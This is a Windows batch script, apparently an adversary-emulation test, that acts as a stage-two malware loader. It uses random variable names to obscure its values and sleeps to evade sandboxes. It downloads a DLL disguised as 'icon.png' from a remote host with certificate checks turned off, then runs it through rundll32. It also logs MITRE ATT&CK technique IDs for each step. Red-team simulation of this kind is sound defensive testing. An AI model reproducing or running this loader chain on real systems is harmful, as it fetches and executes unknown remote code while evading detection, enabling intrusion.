@echo off
setlocal enabledelayedexpansion

REM Random-named SET variable declarations (6-12 chars, no pattern)
SET a1b2c3d4=%APPDATA%\10871\6eab05ce
SET e5f6g7h8=5ca8ce8f.txt
SET i9j0k1l2=https://10.0.0.49/stage/2/icon.png?10871-7
SET m3n4o5p6=BALAM-S2BO
SET q7r8s9t0=10871
SET u1v2w3x4=7
SET y5z6a7b8=%PUBLIC%\\macula-simulations.log

REM Cache timestamp once for all debug lines
SET tsvar=!DATE!/!TIME!

REM --- Initial sandbox evasion delay (10-20s) ---
timeout /t 15 /nobreak >nul

REM --- Heartbeat fetch (Stage 2 Loader DLL) ---
echo [!tsvar!][DEBUG][!m3n4o5p6!][!q7r8s9t0!]: heartbeat_start>> "!y5z6a7b8!" 2>nul
curl -k -s -o "!a1b2c3d4!\!e5f6g7h8!" "!i9j0k1l2!"
echo [!tsvar!][DEBUG][!m3n4o5p6!][!q7r8s9t0!]: heartbeat_complete>> "!y5z6a7b8!" 2>nul

REM --- Delay between operations (ping method) ---
ping -n 10 127.0.0.1 >nul

REM --- Change working directory to output dir ---
echo [!tsvar!][DEBUG][!m3n4o5p6!][!q7r8s9t0!]: chdir_start>> "!y5z6a7b8!" 2>nul
cd /d "!a1b2c3d4!" >nul 2>&1
SET chdir_err=!ERRORLEVEL!
echo [!tsvar!][DEBUG][!m3n4o5p6!][!q7r8s9t0!]: chdir_result=!chdir_err!>> "!y5z6a7b8!" 2>nul

REM --- Delay between operations (CHOICE method) ---
CHOICE /C Y /N /D Y /T 8 >nul

REM --- Log T1497 (Virtualization/Sandbox Evasion) ---
echo [!tsvar!][TTP][!m3n4o5p6!][!q7r8s9t0!]: T1497|Virtualization/Sandbox Evasion=OK:>> "!y5z6a7b8!" 2>nul

REM --- Invoke Stage 2 Loader DLL via rundll32 (LOLBIN) ---
echo [!tsvar!][DEBUG][!m3n4o5p6!][!q7r8s9t0!]: rundll32_start>> "!y5z6a7b8!" 2>nul
rundll32.exe "!e5f6g7h8!", RunDLLW
SET runderr=!ERRORLEVEL!
echo [!tsvar!][DEBUG][!m3n4o5p6!][!q7r8s9t0!]: rundll32_result=!runderr!>> "!y5z6a7b8!" 2>nul

REM --- Log T1218 (System Binary Proxy Execution) ---
echo [!tsvar!][TTP][!m3n4o5p6!][!q7r8s9t0!]: T1218|System Binary Proxy Execution=OK:>> "!y5z6a7b8!" 2>nul

REM --- Final random delay (10-29s) to meet total 30-60s window ---
SET /A randdelay=!RANDOM! %% 20 + 10
timeout /t !randdelay! /nobreak >nul

REM --- Exit cleanly ---
exit /b 0